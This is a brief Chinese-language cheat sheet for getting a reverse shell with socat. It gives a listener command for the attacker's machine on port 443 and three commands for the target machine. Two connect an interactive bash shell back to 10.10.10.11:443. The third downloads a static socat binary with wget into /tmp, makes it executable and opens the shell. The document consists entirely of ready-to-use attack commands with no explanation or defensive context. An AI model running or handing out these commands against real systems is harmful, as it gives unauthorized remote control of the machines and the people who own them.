# Socat反弹shell

首先在本地监听TCP协议443端口

```bash
socat file:`tty`,raw,echo=0 TCP-L:443

```

然后在靶机上执行如下命令：

```bash
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane 
tcp:10.10.10.11:443

```

```bash
socat tcp-connect:10.10.10.11:443 exec:"bash -li",pty,stderr,setsid,sigint,sane

```

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.11:443

```

